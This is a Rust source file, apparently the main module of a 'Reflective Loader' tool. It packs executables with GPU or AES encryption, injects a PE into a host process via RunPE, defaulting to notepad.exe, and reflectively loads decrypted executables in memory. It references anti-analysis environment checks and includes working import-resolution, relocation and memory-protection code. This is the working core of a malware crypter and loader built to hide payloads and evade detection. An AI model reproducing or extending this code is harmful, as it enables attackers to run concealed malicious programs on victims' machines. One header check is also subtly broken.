use std::io::Read;
use std::path::PathBuf;
use std::fs;
use anyhow::{Result, Context};
use log::{info, warn, error};

#[cfg(target_os = "windows")]
use std::mem::size_of;

#[cfg(target_os = "windows")]
use aes::Aes256;
#[cfg(target_os = "windows")]
use cbc::{Decryptor, cipher::{KeyIvInit, BlockDecryptMut, block_padding::Pkcs7}};

#[cfg(target_os = "windows")]
use windows_sys::Win32::System::LibraryLoader::{LoadLibraryA, GetProcAddress};
#[cfg(target_os = "windows")]
use windows_sys::Win32::System::SystemServices::{
    IMAGE_IMPORT_DESCRIPTOR, IMAGE_IMPORT_BY_NAME, IMAGE_BASE_RELOCATION,
};
#[cfg(target_os = "windows")]
use windows_sys::Win32::System::Diagnostics::Debug::{
    IMAGE_OPTIONAL_HEADER32, IMAGE_SECTION_HEADER,
    IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_DIRECTORY_ENTRY_BASERELOC,
    IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_WRITE,
};

#[cfg(target_os = "windows")]
const IMAGE_REL_BASED_ABSOLUTE: u32 = 0;
#[cfg(target_os = "windows")]
const IMAGE_REL_BASED_HIGHLOW: u32 = 3;
#[cfg(target_os = "windows")]
const IMAGE_REL_BASED_DIR64: u32 = 10;
#[cfg(target_os = "windows")]
use windows_sys::Win32::System::Memory::{
    VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_READ,
    PAGE_READWRITE, PAGE_READONLY,
};

mod protection;
mod gpu_packer;
mod reflective_loader;
mod runpe;
mod cli;

#[cfg(test)]
mod tests;

fn main() -> Result<(), anyhow::Error> {
    env_logger::init();
    info!("Reflective Loader starting up");
    
    let cli_args = cli::parse_args();
    
    if cli_args.verbose {
        info!("Verbose mode enabled");
    }
    
    match cli_args.command {
        cli::Commands::Pack(args) => {
            info!("Packing file: {:?} -> {:?}", args.input, args.output);
            
            let config = gpu_packer::PackerConfig {
                device_index: args.gpu_device,
                segment_size: args.segment_size,
                iterations: args.iterations,
                use_encryption: !args.no_encryption,
            };
            
            let input_path = args.input.clone();
            gpu_packer::pack_file(args.input, args.output, &config)
                .with_context(|| format!("Failed to pack file: {:?}", input_path))?;
            
            info!("File packed successfully");
        },
        
        cli::Commands::Unpack(args) => {
            info!("Unpacking file: {:?} -> {:?}", args.input, args.output);
            
            let input_path = args.input.clone();
            gpu_packer::unpack_file(args.input, args.output)
                .with_context(|| format!("Failed to unpack file: {:?}", input_path))?;
            
            info!("File unpacked successfully");
        },
        
        cli::Commands::ListGpus => {
            info!("Listing available GPU devices");
            
            #[cfg(feature = "gpu-packing")]
            {
                match gpu_packer::list_gpu_devices() {
                    Ok(devices) => {
                        println!("Available GPU devices:");
                        for device in devices {
                            println!("  {}", device);
                        }
                    },
                    Err(e) => {
                        warn!("Failed to list GPU devices: {}", e);
                        println!("No GPU devices available for acceleration");
                    }
                }
            }
            
            #[cfg(not(feature = "gpu-packing"))]
            {
                println!("GPU packing feature not enabled");
                println!("Compile with --features gpu-packing to enable GPU acceleration");
            }
        },
        
        cli::Commands::Run(args) => {
            info!("Running file: {:?}", args.input);
            
            #[cfg(target_os = "windows")]
            {
                if args.runpe {
                    info!("Using RUNPE injection");
                    
                    let target_path = args.target.unwrap_or_else(|| {
                        PathBuf::from("C:\\Windows\\System32\\notepad.exe")
                    });
                    
                    let config = runpe::RunPeConfig {
                        target_path: target_path.to_string_lossy().to_string(),
                        arguments: args.args,
                        auto_resume: !args.no_auto_resume,
                        memory_strategy: runpe::MemoryAllocationStrategy::Standard,
                        section_strategy: runpe::SectionMappingStrategy::Standard,
                    };
                    
                    let input_path = args.input.clone();
                    let pe_data = fs::read(&input_path)
                        .with_context(|| format!("Failed to read file: {:?}", input_path))?;
                    
                    let process_id = runpe::inject_pe(&pe_data, &config)
                        .with_context(|| "RUNPE injection failed")?;
                    
                    info!("RUNPE injection successful, process ID: {}", process_id);
                } else {
                    info!("Using reflective loading");
                    
                    let input_path = args.input.clone();
                    let file_data = fs::read(&input_path)
                        .with_context(|| format!("Failed to read file: {:?}", input_path))?;
                    
                    if file_data.len() >= 8 && &file_data[0..8] == b"GPUPACKED" {
                        info!("Detected packed file, using GPU packer loader");
                        
                        let exit_code = gpu_packer::load_packed_executable_from_memory(
                            &file_data,
                            None, // Use CPU unpacking by default
                        ).with_context(|| "Failed to load packed executable")?;
                        
                        info!("Packed executable returned exit code: {}", exit_code);
                    } else if file_data.len() >= 2 && &file_data[0..2] == b"MZ" {
                        info!("Detected PE file, using reflective loader");
                        
                        let exit_code = reflective_loader::load_pe(&file_data)
                            .with_context(|| "Failed to load PE file")?;
                        
                        info!("PE file returned exit code: {}", exit_code);
                    } else {
                        info!("Attempting to decrypt and load file");
                        
                        let key = reflective_loader::get_aes_key();
                        let iv = reflective_loader::get_aes_iv();
                        
                        let exit_code = reflective_loader::load_encrypted_pe(&file_data, &key, &iv)
                            .with_context(|| "Failed to decrypt and load file")?;
                        
                        info!("Encrypted file returned exit code: {}", exit_code);
                    }
                }
            }
            
            #[cfg(not(target_os = "windows"))]
            {
                error!("Reflective loading is only supported on Windows");
                println!("This feature is only available on Windows");
                println!("Please compile and run this on a Windows machine");
                
                println!("\nDemonstrating secure key generation:");
                match protection::key_generator::generate_aes256_key() {
                    Ok(key) => {
                        println!("Generated AES-256 key: {:?}", key);
                        println!("Key length: {} bytes", key.len());
                    },
                    Err(e) => println!("Error generating key: {}", e),
                }
                
                println!("\nPerforming environment analysis for legitimate security purposes:");
                let analysis = protection::anti_analysis::analyze_environment();
                println!("Analysis detected suspicious environment: {}", analysis.detected);
                if analysis.detected {
                    println!("Detections:");
                    for detection in &analysis.detections {
                        println!("  - {:?}", detection);
                    }
                } else {
                    println!("No suspicious environment detected.");
                }
            }
        },
    }
    
    Ok(())
}

#[cfg(target_os = "windows")]
fn decrypt_aes256_cbc(
    ciphertext: &[u8],
    key: &[u8],
    iv: &[u8],
) -> Result<Vec<u8>, String> {
    if key.len() != 32 || iv.len() != 16 {
        return Err("Key must be 32 bytes, IV must be 16 bytes.".into());
    }
    let cipher = Decryptor::<Aes256>::new_from_slices(key, iv)
        .map_err(|_| "new_from_slices failed (invalid key/iv?)".to_string())?;
    let mut buffer = vec![0u8; ciphertext.len()];
    cipher
        .decrypt_padded_mut::<Pkcs7>(&mut buffer)
        .map_err(|e| format!("AES-256-CBC decryption failed: {:?}", e))
        .map(|decrypted| decrypted.to_vec())
}

#[cfg(target_os = "windows")]
fn resolve_imports(image_base: usize, opt_header: &IMAGE_OPTIONAL_HEADER32) -> Result<(), String> {
    let import_dir = opt_header.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT as usize];
    let import_desc_ptr = (image_base + import_dir.VirtualAddress as usize) as *const IMAGE_IMPORT_DESCRIPTOR;

    unsafe {
        let mut idx = 0;
        loop {
            let desc = *import_desc_ptr.add(idx);
            if desc.Name == 0 {
                break; // No more import descriptors
            }
            let dll_name_ptr_u8 = (image_base + desc.Name as usize) as *const u8;

            let dll_handle = LoadLibraryA(dll_name_ptr_u8);
            if dll_handle == 0 {
                let dll_name_i8 = dll_name_ptr_u8 as *const i8;
                let dll_name = std::ffi::CStr::from_ptr(dll_name_i8).to_string_lossy();
                return Err(format!("Failed to load library: {}", dll_name));
            }

            let mut oft_ptr = (image_base + desc.Anonymous.OriginalFirstThunk as usize) as *const usize;
            let mut ft_ptr  = (image_base + desc.FirstThunk as usize) as *mut usize;

            if desc.Anonymous.OriginalFirstThunk == 0 {
                oft_ptr = ft_ptr as *const usize;
            }

            let mut i = 0;
            loop {
                let lookup_val = *oft_ptr.add(i);
                if lookup_val == 0 {
                    break; // end of this import descriptor
                }

                let func_addr: usize;

                if (lookup_val & 0x80000000) != 0 {
                    let ordinal = (lookup_val & 0xFFFF) as u16;
                    let proc_opt = GetProcAddress(dll_handle, ordinal as *const u8);
                    if let Some(fn_ptr) = proc_opt {
                        func_addr = fn_ptr as usize;
                    } else {
                        return Err(format!("Failed to resolve ordinal {}", ordinal));
                    }
                } else {
                    let ibn_ptr = (image_base + lookup_val as usize) as *const IMAGE_IMPORT_BY_NAME;
                    let name_ptr_u8 = (*ibn_ptr).Name.as_ptr();
                    let proc_opt = GetProcAddress(dll_handle, name_ptr_u8);
                    if let Some(fn_ptr) = proc_opt {
                        func_addr = fn_ptr as usize;
                    } else {
                        let name_i8 = name_ptr_u8 as *const i8;
                        let func_name = std::ffi::CStr::from_ptr(name_i8).to_string_lossy();
                        return Err(format!("Failed to resolve import by name: {}", func_name));
                    }
                }

                *ft_ptr.add(i) = func_addr;
                i += 1;
            }
            idx += 1;
        }
    }
    Ok(())
}

#[cfg(target_os = "windows")]
fn apply_relocations(
    image_base: usize,
    preferred_base: usize,
    opt_header: &IMAGE_OPTIONAL_HEADER32
) -> Result<(), String> {
    let base_reloc_dir = opt_header.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
    let reloc_va  = base_reloc_dir.VirtualAddress as usize;
    let reloc_end = reloc_va + base_reloc_dir.Size as usize;

    if reloc_va == 0 {
        return Ok(()); // no relocations
    }
    let delta = (image_base as isize) - (preferred_base as isize);
    if delta == 0 {
        return Ok(()); // loaded at preferred base
    }

    unsafe {
        let mut current_block = (image_base + reloc_va) as *const IMAGE_BASE_RELOCATION;
        while (current_block as usize) < (image_base + reloc_end) {
            let block = *current_block;
            if block.SizeOfBlock == 0 {
                break;
            }
            let entries_count = (block.SizeOfBlock as usize - size_of::<IMAGE_BASE_RELOCATION>()) / 2;
            let reloc_info_ptr = (current_block as usize + size_of::<IMAGE_BASE_RELOCATION>()) as *const u16;

            for i in 0..entries_count {
                let entry = *reloc_info_ptr.add(i);
                let reloc_type = entry >> 12;
                let offset     = entry & 0xFFF;

                match reloc_type as u32 {
                    IMAGE_REL_BASED_ABSOLUTE => { /* no fixup needed */ }
                    IMAGE_REL_BASED_DIR64 => {
                        let patch_addr = (image_base + block.VirtualAddress as usize + offset as usize) as *mut usize;
                        *patch_addr = (*patch_addr as isize + delta) as usize;
                    }
                    IMAGE_REL_BASED_HIGHLOW => {
                        let patch_addr = (image_base + block.VirtualAddress as usize + offset as usize) as *mut u32;
                        *patch_addr = (*patch_addr as i64 + delta as i64) as u32;
                    }
                    _ => {}
                }
            }
            current_block = (current_block as usize + block.SizeOfBlock as usize) as *const IMAGE_BASE_RELOCATION;
        }
    }
    Ok(())
}

#[cfg(target_os = "windows")]
fn set_section_permissions(
    image_base: usize,
    sections: &[IMAGE_SECTION_HEADER],
    opt_header: &IMAGE_OPTIONAL_HEADER32,
) -> Result<(), String> {
    unsafe {
        for sect in sections {
            let rva = sect.VirtualAddress as usize;
            let size = sect.Misc.VirtualSize as usize;
            if size == 0 {
                continue;
            }
            let dest_ptr = (image_base + rva) as *mut core::ffi::c_void;

            let characteristics = sect.Characteristics;
            let is_exec  = (characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
            let is_write = (characteristics & IMAGE_SCN_MEM_WRITE)   != 0;

            let new_protect = match (is_exec, is_write) {
                (true, true)  => PAGE_EXECUTE_READWRITE,
                (true, false) => PAGE_EXECUTE_READ,
                (false, true) => PAGE_READWRITE,
                _             => PAGE_READONLY,
            };

            let mut old_protect = 0;
            if VirtualProtect(dest_ptr, size, new_protect, &mut old_protect) == 0 {
                return Err(format!("VirtualProtect failed for section at RVA=0x{:X}", rva));
            }
        }
    }
    Ok(())
}
